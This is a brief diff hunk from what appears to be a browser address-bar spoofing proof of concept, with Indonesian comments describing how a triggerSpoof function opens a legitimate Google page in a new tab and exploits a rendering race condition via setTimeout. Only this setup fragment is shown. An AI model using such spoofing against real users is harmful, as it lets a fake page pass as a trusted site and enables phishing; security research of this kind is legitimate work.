@@ -18,7 +18,7 @@
   <script>
     function triggerSpoof() {
       // 1. Buka situs sah di tab baru. Peramban akan mulai memuat dan mengubah Address Bar.
-      var spoofWindow = window.open('https://www.google.com', 'spoofTab');
+      var spoofWindow = window.open('https://www.google.com/intl/id_id/chrome/', 'spoofTab');
 
       // 2. Race Condition: Gunakan setTimeout untuk mengeksploitasi jeda waktu perenderan.
       // Waktu (ms) ini mungkin perlu disesuaikan (di-fuzzing) tergantung kecepatan koneksi dan browser target.
